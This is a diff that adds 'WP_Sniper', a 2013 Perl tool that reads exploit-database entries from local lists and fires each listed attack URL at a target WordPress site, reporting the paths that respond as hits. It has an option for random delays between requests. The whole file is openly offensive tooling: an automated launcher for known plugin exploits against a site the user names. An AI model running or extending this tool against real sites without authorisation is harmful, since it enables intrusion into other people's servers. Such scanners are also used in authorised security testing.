@@ -1,0 +1,114 @@
+#!/usr/bin/perl -w
+#
+# WP_Sniper - 2013 WNL - pWeb Suite
+# weaknetlabs@gmail.com
+#
+use LWP::UserAgent; # for HTTP requests
+use Term::ANSIColor;
+copyright(); # what did you run?
+if(!$ARGV[0]){ # forgot to add URL?
+	error("url");
+}elsif($ARGV[0] !~ m/^http\:\/\//){
+	error("link");
+}else{
+	chomp $ARGV[0];
+	$ARGV[0] =~ s/\/$//; # drop this for some server configs get mad @ u bro.
+}
+my $on = 0; # token
+my @URLS = (); # URLs to attack for current vuln
+my $auth; # Creditz
+my $exp; # exploit DB URL
+my $expt = ''; # exploit titleA
+my $myua = "Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18";
+my $succ = 0; # for tallying up successes
+my $exsucc = 0; # individual exploit counts
+go("plugin_list.txt");
+if (grep(/-d/,@ARGV)){
+	go("defaults.txt"); # we specified to check defaults list
+	exit;
+}
+sub go{
+	my @files = `cat $_[0]`;
+	foreach(@files){
+		if($_ =~ m/method=.post./){
+			next; # some are specifically for forms
+		}
+		chomp $_; # clean it a bit
+		if($_ =~ m/^\*BEG/) { $on = 1; } # token
+		if($on == 1) { # begin building entry:
+			if($_ =~ m/^EXPU/) { $exp = $_; $exp =~ s/.*: //; }
+			if($_ =~ m/^Expl/){ $expt = $_; $expt =~ s/.*: //; }
+			if($_ =~ m/^Autho/) { $auth = $_; $auth =~ s/Author\s*:\s*//; }
+			if($_ =~ m/^URL/) { $u = $_; $u =~ s/.*: //; push(@URLS,$u); }
+			if($_ =~ m/^\*END/){
+				if(grep(/\/wp-./,@URLS)){ # does a URL even exist for entry? (sometimes not) super dynamic!
+					$on = 0; # turn on token
+					foreach $m (@URLS){
+						# random wait?
+						if(grep(/-r/,@ARGV)){
+							my $rs = int(rand(5)) +1;
+							sleep $rs;
+						}
+						# clean up $m from HTML garbage:
+						$m =~ s/&amp;/&/g;
+						$m =~ s/&gt;/>/g;
+						$m =~ s/&lt;/</g;
+						my $url = $ARGV[0]; # reset URL
+						$url .= $m; # append exploit
+						# test URL for HTTP return status:
+						my $ua = LWP::UserAgent->new; 
+						$ua->agent($myua);
+						my $req = HTTP::Request->new(GET => $url);
+						my $res = $ua->request($req);
+						if($res->is_success && $res->content !~ m/Log In<\/title>/){
+							$exsucc++; # total local successes for this exploit
+							$succ++; # total successes
+							colorTxt("bold green", " [ ! ]");
+							print "\tSuccess: " . $ARGV[0];
+							colorTxt("bold red",$m . "\n");
+						}
+					}
+					if($exsucc > 0) { # did we find at least one success?
+						if($expt ne ''){
+							print " +----------------------------------------+\n\tDescription: ";
+							colorTxt("bold white",$expt . "\n");
+						}
+						print "\tExploit: ";
+						colorTxt("bold white",$exp);
+						print "\n\tAuthor: " . $auth . "\n\t" . $exsucc . " successful URLs\n\n";
+					}
+					$exsucc = 0; # reset counter
+					@URLS = (); $exp = ''; $auth = ''; # reset, we are done.
+				}
+			} # END entry
+		}
+	}
+}
+if($succ > 0) { 
+	colorTxt("bold green"," [ ! ] ");
+	print $succ . " total successful URLs.\n\n";
+}else{
+	print "\n[ X ] I could not find any vulnerabilities.\n\n";
+}
+sub error{
+	colorTxt("bold red"," error:");
+	if($_[0] eq 'url'){
+		print " no URL provided.\n";
+		usage();
+	}elsif($_[0] eq 'link'){
+		print " the link you provided is not valid\n\n";
+	}
+	exit;
+}
+sub colorTxt{
+	print color $_[0]; 
+	print $_[1];
+	print color 'reset';
+}
+sub copyright{
+	colorTxt("bold cyan","\n Wordpress Sniper");
+	print " - 2013 WeakNet Laboratories\n\n";
+}
+sub usage{
+	print " Usage:\t./wp-sniper <URL> <OPTIONS>\n Options:\t-d (check default files)\n\t\t-r (random wait (5000ms))\n\n";
+}
